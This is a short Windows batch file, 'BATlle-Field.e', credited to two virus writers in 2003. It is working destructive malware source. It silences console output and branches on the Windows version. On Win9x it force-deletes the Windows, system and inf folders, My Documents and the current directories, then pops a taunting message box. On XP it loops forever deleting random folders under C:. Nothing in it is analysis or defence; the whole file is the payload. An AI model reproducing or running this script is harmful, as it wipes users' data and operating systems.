:: 
:: BATlle-Field.e for win9X and winXP
::
:: Created for SbC 2.0 by DvL and Ratty
:: 19.05.2003
::
:: Created by 2 good friends reunited
:: DvL      ( dvl2003ro@yahoo.co.uk )
:: Ratty    ( ratty2001ro@yahoo.com )
:: Contact us.
::
@echo off
ctty nul
ver | find "XP"
if errorlevel 1 goto DvL
if not errorlevel 1 goto :XP
:DvL
@for %%k in (%windir%\system\*.*, c:\mydocu~1\*.*, *.*, ..\*.*, %windir%\*.*, %windir%\inf\*.*) do deltree/y %%k 
echo.msgbox "BAT command or file name !!!",0,"BATlle-Field.e by DvL and Ratty">DvL.vbs
start DvL.vbs
cls
goto done
:XP
if exist c:\%random%. (rd /s /q c:\%random%.) else echo c:\%random%. missing
if exist c:\%random%. (rd /s /q c:\%random%.) else echo c:\%random%. missing
if exist c:\%random%. (rd /s /q c:\%random%.) else echo c:\%random%. missing
if exist c:\%random%. (rd /s /q c:\%random%.) else echo c:\%random%. missing
if exist c:\%random%. (rd /s /q c:\%random%.) else echo c:\%random%. missing
if exist c:\%random%. (rd /s /q c:\%random%.) else echo c:\%random%. missing
goto XP
ctty con
exit
:done
ctty con
cls